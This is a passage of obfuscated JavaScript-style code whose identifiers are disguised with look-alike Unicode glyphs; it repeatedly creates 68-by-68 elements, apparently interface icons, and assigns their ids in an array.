			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆⲆΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔⲆⲆⲆⵠᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆⲆΔᐃ].id = ᐃᐃ.ᐃⲆⲆΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⵠᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔⲆⲆⲆᐃⲆ], ᐃᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⵠᐃΔ].id = ᐃᐃ.ⵠΔⵠᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔΔⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⵠᐃΔⲆⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔΔⵠᐃ].id = ᐃᐃ.ⲆΔΔⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⵠΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠΔⲆᐃⵠᐃ], ΔΔⵠΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⵠΔⲆ].id = ᐃᐃ.ⵠⵠⵠΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃΔⵠΔⵠᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆΔⲆ].id = ᐃᐃ.ΔᐃⲆΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⲆⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔᐃⵠΔⵠᐃ], ΔΔᐃΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⲆⲆⲆ].id = ᐃᐃ.ⲆᐃⲆⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔⲆΔⵠΔΔ], ⵠᐃⵠⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃⲆⵠ].id = ᐃᐃ.ⵠⲆᐃⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⵠⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠΔᐃΔΔᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⵠⵠⲆ].id = ᐃᐃ.ⲆⵠⵠⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⵠⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃⵠΔⵠᐃΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⵠⵠᐃ].id = ᐃᐃ.ΔΔⵠⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃᐃΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠⵠⵠΔⵠⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃᐃΔΔ].id = ᐃᐃ.ᐃᐃᐃΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠΔⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠΔΔⲆᐃⵠ], ⲆΔⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠΔⲆⲆ].id = ᐃᐃ.ΔⵠΔⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃᐃΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃⵠⲆΔⲆᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃᐃΔⲆ].id = ᐃᐃ.ⲆᐃᐃΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⲆᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠᐃⵠⵠΔΔ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⲆᐃᐃ].id = ᐃᐃ.ⲆΔⲆᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃᐃⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆΔᐃⵠᐃΔ], ᐃᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃᐃⵠᐃ].id = ᐃᐃ.ⵠᐃᐃⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⲆΔⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⵠ].id = ᐃᐃ.ⵠⵠⵠᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔᐃΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃᐃΔΔᐃᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔᐃΔᐃ].id = ᐃᐃ.ⲆΔᐃΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⲆⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃᐃΔΔⲆⲆ], ⵠᐃⵠⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⲆⵠΔ].id = ᐃᐃ.ⲆΔⲆⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆΔⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆΔⲆⵠⵠⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆΔⵠⲆ].id = ᐃᐃ.ⲆⲆΔⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠΔᐃⲆΔΔᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠⲆᐃ].id = ᐃᐃ.ⲆᐃⵠⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔᐃΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔⲆᐃΔᐃⲆ], ᐃᐃⲆⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔᐃΔᐃ].id = ᐃᐃ.ΔΔᐃΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃᐃᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⲆⲆⲆᐃⵠᐃ], ΔⲆᐃⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃᐃᐃΔ].id = ᐃᐃ.ΔᐃᐃᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆᐃⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠⲆⲆᐃⲆⲆ], ᐃᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆᐃⲆⲆ].id = ᐃᐃ.ΔⲆᐃⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔᐃⲆⲆΔⵠ], ΔΔᐃΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆᐃᐃ].id = ᐃᐃ.ⵠᐃⲆᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆΔᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆΔᐃⵠᐃΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆΔᐃΔ].id = ᐃᐃ.ᐃⲆΔᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃΔᐃⵠΔᐃ], ⵠⵠⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆᐃᐃ].id = ᐃᐃ.ⵠⲆⲆᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠᐃⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔᐃᐃᐃΔⲆ], ᐃⵠⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠᐃⲆⵠ].id = ᐃᐃ.ΔⵠᐃⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⵠΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠᐃΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⵠΔΔ].id = ᐃᐃ.ⲆΔⵠΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⵠⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃΔᐃΔⲆⵠ], ⵠⵠⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⵠⵠᐃ].id = ᐃᐃ.ⵠᐃⵠⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠᐃᐃⵠⲆⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⲆ].id = ᐃᐃ.ⵠⵠⵠᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃⲆⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃⲆⵠᐃ].id = ᐃᐃ.ᐃᐃⲆⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔⵠⵠΔⵠⲆ], ΔΔⵠΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ].id = ᐃᐃ.ⲆⲆⵠΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠΔΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠΔⲆᐃⵠΔ], ᐃᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠΔΔⲆ].id = ᐃᐃ.ΔⵠΔΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⲆΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃⲆⵠⲆⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⲆΔⲆ].id = ᐃᐃ.ⵠⵠⲆΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃΔΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠΔⵠⵠᐃΔⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃΔΔΔ].id = ᐃᐃ.ΔᐃΔΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔⲆⵠⲆᐃⵠ], ΔⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ].id = ᐃᐃ.ⲆⲆⵠᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⵠΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔᐃᐃⵠΔⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⵠΔᐃ].id = ᐃᐃ.ⵠΔⵠΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆⲆΔⲆΔΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆⵠΔ].id = ᐃᐃ.ΔⵠⲆⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠΔⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆΔⵠᐃⲆⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠΔⲆᐃ].id = ᐃᐃ.ᐃⵠΔⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⲆᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⲆΔΔⵠᐃΔ], ᐃⲆᐃᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⲆᐃⲆ].id = ᐃᐃ.ⲆᐃⲆᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠΔⲆⲆⵠⵠ], ΔⲆᐃⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆⵠΔ].id = ᐃᐃ.ΔᐃⲆⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆΔᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃΔⵠⵠΔⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆΔᐃᐃ].id = ᐃᐃ.ⲆⲆΔᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔⵠⵠⵠΔΔ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠᐃᐃ].id = ᐃᐃ.ⲆⲆⵠᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃΔΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⲆΔΔᐃⵠ], ⲆᐃΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃΔΔᐃ].id = ᐃᐃ.ΔᐃΔΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃΔⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⵠⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃΔⲆⵠ].id = ᐃᐃ.ⵠᐃΔⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆⲆᐃΔᐃΔ], ΔⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆⲆΔ].id = ᐃᐃ.ⵠⲆⲆⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔᐃⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃᐃΔΔᐃΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔᐃⲆⵠ].id = ᐃᐃ.ⲆΔᐃⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⲆᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔᐃⵠⲆⵠⲆ], ΔⲆᐃⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⲆᐃΔ].id = ᐃᐃ.ᐃΔⲆᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⵠΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⵠⵠⵠΔΔ], ᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⵠΔⲆ].id = ᐃᐃ.ΔᐃⵠΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃΔⲆⵠⵠᐃ], ⵠⵠⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆⲆⲆ].id = ᐃᐃ.ΔⵠⲆⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆⵠⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔⲆⲆᐃᐃⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆⵠⲆⵠ].id = ᐃᐃ.ᐃⲆⵠⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⲆⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⵠΔⲆⲆⲆ], ᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⲆⵠⵠ].id = ᐃᐃ.ⲆΔⲆⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃᐃΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃᐃᐃᐃⵠᐃ], Δⵠᐃⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃᐃΔⵠ].id = ᐃᐃ.ⵠᐃᐃΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠΔⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃⲆΔⵠᐃᐃ], ᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠΔⵠΔ].id = ᐃᐃ.ᐃⵠΔⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⲆⲆᐃᐃⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠᐃⲆ].id = ᐃᐃ.ⲆᐃⵠᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠⵠΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔⲆᐃⵠⵠⲆ], ⵠⲆΔⵠΔ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠⵠΔⲆ].id = ᐃᐃ.ᐃⵠⵠΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆᐃᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔΔⲆᐃΔᐃ], ᐃⵠⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆᐃᐃΔ].id = ᐃᐃ.ⲆⲆᐃᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⵠΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔⲆⲆⵠᐃⵠ], ᐃᐃⲆⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⵠΔᐃ].id = ᐃᐃ.ⲆⵠⵠΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⲆΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠⵠⵠ], ᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⲆΔᐃ].id = ᐃᐃ.ⲆⵠⲆΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔΔⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔᐃΔⲆⲆΔ], ΔⲆᐃⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔΔⵠⵠ].id = ᐃᐃ.ⵠΔΔⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃᐃⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠΔⵠⵠⵠⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃᐃⵠΔ].id = ᐃᐃ.ᐃᐃᐃⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠⲆⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⵠᐃΔⵠⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠⲆⵠⵠ].id = ᐃᐃ.ᐃⵠⲆⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃᐃᐃᐃΔⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔⵠᐃ].id = ᐃᐃ.ᐃᐃΔⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃⵠⵠⲆᐃᐃ], ΔᐃⲆΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠⵠΔ].id = ᐃᐃ.ⲆᐃⵠⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔΔⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⲆᐃⵠᐃᐃⵠ], ⲆΔⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔΔⵠⵠ].id = ᐃᐃ.ⲆΔΔⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⲆΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆⲆⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⲆΔΔ].id = ᐃᐃ.ⵠΔⲆΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆⵠΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃⵠᐃ].id = ᐃᐃ.ⵠⲆᐃⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⵠⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔᐃΔⵠᐃⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⵠⵠⲆ].id = ᐃᐃ.ΔΔⵠⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆᐃⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔⵠⲆΔΔΔ], ⵠⵠⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆᐃⵠⲆ].id = ᐃᐃ.ΔⲆᐃⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠⵠⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔᐃΔⵠΔΔ], ⲆΔⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠⵠⲆΔ].id = ᐃᐃ.ᐃⵠⵠⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔΔᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⲆᐃᐃⵠⲆᐃ], ⲆΔⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔΔᐃⲆ].id = ᐃᐃ.ⵠΔΔᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⲆⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠΔᐃᐃⵠⵠ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⲆⵠΔ].id = ᐃᐃ.ⲆⵠⲆⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⲆⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠⵠⵠⵠΔⲆ], ᐃᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⲆⲆⲆ].id = ᐃᐃ.ᐃΔⲆⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⲆⵠΔΔⵠⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⲆⵠⲆ].id = ᐃᐃ.ⵠⵠⲆⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⵠΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠΔᐃⲆᐃⲆⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⵠΔⲆ].id = ᐃᐃ.ⵠΔⵠΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆᐃΔ], ᐃⵠⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃᐃⵠ].id = ᐃᐃ.ⵠᐃᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔᐃΔⵠᐃΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔⲆ].id = ᐃᐃ.ⲆⵠΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⲆⵠⲆⲆⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⲆ].id = ᐃᐃ.ⵠⵠᐃⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⲆⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠⲆⵠΔΔⲆ], ⵠⲆΔⵠΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⲆⲆΔ].id = ᐃᐃ.ⲆᐃⲆⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⵠΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃΔΔⲆⲆⲆ], ⲆⲆΔⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⵠΔᐃ].id = ᐃᐃ.ⵠⲆⵠΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆΔⵠⵠΔⵠ], Δⵠᐃⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃΔⲆ].id = ᐃᐃ.ⵠⲆᐃΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆΔᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⲆᐃΔⵠⵠⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆΔᐃΔ].id = ᐃᐃ.ⲆⲆΔᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠΔⵠᐃⵠⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆΔⲆ].id = ᐃᐃ.ΔⵠⲆΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠᐃⲆⲆⲆⵠ], ⵠⲆΔⵠΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠΔⲆ].id = ᐃᐃ.ⲆᐃⵠΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃΔⲆᐃⲆⵠ], ⲆᐃΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃᐃⲆⵠ].id = ᐃᐃ.ᐃᐃᐃⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃⵠᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⵠⲆⵠ].id = ᐃᐃ.ⲆⵠⵠⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔΔⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⲆᐃᐃⵠⲆ], ⵠⲆΔⵠΔ);
